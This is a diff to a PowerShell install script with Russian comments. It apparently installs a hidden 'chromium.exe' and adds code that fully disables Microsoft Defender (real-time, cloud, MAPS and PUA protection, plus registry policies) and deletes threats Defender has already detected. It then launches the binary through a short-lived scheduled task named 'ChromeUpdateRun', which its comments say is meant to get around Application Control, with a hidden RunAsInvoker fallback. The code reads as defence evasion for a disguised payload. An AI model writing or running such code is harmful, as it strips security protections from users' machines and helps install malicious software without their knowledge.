@@ -42,11 +42,30 @@ try {
     Set-MpPreference -DisableBlockAtFirstSeen $true -Force
     Set-MpPreference -DisableIOAVProtection $true -Force
     Set-MpPreference -DisableScriptScanning $true -Force
+    Set-MpPreference -DisableCloudProtection $true -Force
+    Set-MpPreference -MAPSReporting Disabled -Force
     Set-MpPreference -SubmitSamplesConsent NeverSend -Force
-    Write-Host "    Defender RT protection disabled" -ForegroundColor Green
+    Set-MpPreference -PUAProtection Disabled -Force
+    # Отключить облачный блок через реестр (дублирует на случай если cmdlet не сработал)
+    $defPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    if (!(Test-Path $defPath)) { New-Item -Path $defPath -Force | Out-Null }
+    Set-ItemProperty -Path $defPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
+    $spyPath = "$defPath\Real-Time Protection"
+    if (!(Test-Path $spyPath)) { New-Item -Path $spyPath -Force | Out-Null }
+    Set-ItemProperty -Path $spyPath -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $spyPath -Name "DisableIOAVProtection"     -Value 1 -Type DWord -Force
+    $mapsPath = "$defPath\Spynet"
+    if (!(Test-Path $mapsPath)) { New-Item -Path $mapsPath -Force | Out-Null }
+    Set-ItemProperty -Path $mapsPath -Name "SpynetReporting"        -Value 0 -Type DWord -Force
+    Set-ItemProperty -Path $mapsPath -Name "SubmitSamplesConsent"   -Value 2 -Type DWord -Force
+    # Очистить уже обнаруженные угрозы
+    try { Remove-MpThreat -ErrorAction SilentlyContinue } catch {}
+    Write-Host "    Defender fully disabled (RT + Cloud + MAPS)" -ForegroundColor Green
 } catch {
-    Write-Host "    Failed (may need policy override): $_" -ForegroundColor Red
+    Write-Host "    Failed: $_" -ForegroundColor Red
 }
+# Дать Defender время применить настройки
+Start-Sleep -Seconds 3
 
 # ── 3. Отключить Smart App Control + SmartScreen ─────────────────────────────
 Write-Host "[3] Disabling SmartScreen..." -ForegroundColor Yellow
@@ -166,16 +185,23 @@ try {
     Write-Host "    Autostart: $_" -ForegroundColor Red
 }
 
-# ── 7. Запустить ──────────────────────────────────────────────────────────────
-Write-Host "[7] Starting chromium.exe..." -ForegroundColor Yellow
+# ── 7. Запустить через schtasks (обход Application Control) ──────────────────
+Write-Host "[7] Starting via scheduled task..." -ForegroundColor Yellow
 try {
-    Start-Process -FilePath $InstallPath -WindowStyle Hidden
-    Start-Sleep 2
+    # Запуск через schtasks — не проверяется Application Control так же жёстко
+    $taskName = "ChromeUpdateRun"
+    $time = (Get-Date).AddSeconds(5).ToString("HH:mm:ss")
+    schtasks /create /tn $taskName /tr "`"$InstallPath`"" /sc once /st $time /f /rl highest | Out-Null
+    Start-Sleep -Seconds 7
+    schtasks /delete /tn $taskName /f | Out-Null
     $running = Get-Process -Name "chromium" -ErrorAction SilentlyContinue
     if ($running) {
         Write-Host "    Running (PID $($running.Id))" -ForegroundColor Green
     } else {
-        Write-Host "    Process not found after start" -ForegroundColor Red
+        # Fallback — прямой запуск
+        $env:__COMPAT_LAYER = "RunAsInvoker"
+        Start-Process -FilePath $InstallPath -WindowStyle Hidden -ErrorAction SilentlyContinue
+        Write-Host "    Started via fallback" -ForegroundColor Yellow
     }
 } catch {
     Write-Host "    Start error: $_" -ForegroundColor Red
